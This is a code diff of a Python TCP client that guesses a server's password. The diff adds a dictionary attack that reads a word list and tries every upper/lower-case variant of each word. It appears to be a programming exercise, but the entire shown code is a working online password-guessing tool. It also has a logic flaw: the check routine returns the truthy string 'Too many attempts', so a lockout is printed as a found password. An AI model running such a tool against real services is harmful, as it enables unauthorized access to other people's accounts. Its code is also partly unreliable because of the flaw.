@@ -21,7 +21,7 @@ class TCPClient:
     def send_data(self, data):
         if self.socket is None:
             self.connect()
-        self.socket.send(data)
+        self.socket.send(data.encode())
 
     def read_data(self):
         if self.socket is None:
@@ -33,14 +33,37 @@ class Passwords:
     def __init__(self, conn):
         self.conn = conn
 
-    def brute_pass(self):
+    def brute_password(self):
         for password in Passwords.generate_password():
-            msg = ''.join(map(str, password)).encode()
-            self.conn.send_data(msg)
-            resp = self.conn.read_data()
-            if resp == 'Connection success!':
-                print(msg.decode())
+            if self.check_password(''.join(map(str, password))):
+                print(password)
                 break
+
+    def dict_mod(self, dictionary):
+        with open(dictionary, 'r') as dictionary:
+            for password in Passwords.case_swith(dictionary):
+                if self.check_password(password):
+                    print(password)
+                    break
+
+    @staticmethod
+    def case_swith(dictionary):
+        for password in dictionary:
+            password = password.strip("\n")
+            if password.isdecimal():
+                yield password
+            else:
+                for val in product(*([letter.lower(), letter.upper()] for letter in password)):
+                    yield ''.join(val)
+
+    def check_password(self, password):
+        self.conn.send_data(password)
+        resp = self.conn.read_data()
+        if resp == 'Connection success!':
+            return password
+        if resp == 'Too many attempts':
+            return 'Too many attempts'
+        return False
 
     @staticmethod
     def generate_password():
@@ -59,8 +82,9 @@ def main():
 
     conn = TCPClient(args.host, args.port)
     conn.connect()
-    Passwords(conn).brute_pass()
+    Passwords(conn).dict_mod('passwords.txt')
     conn.disconnect()
+
 
 if __name__ == '__main__':
     main()
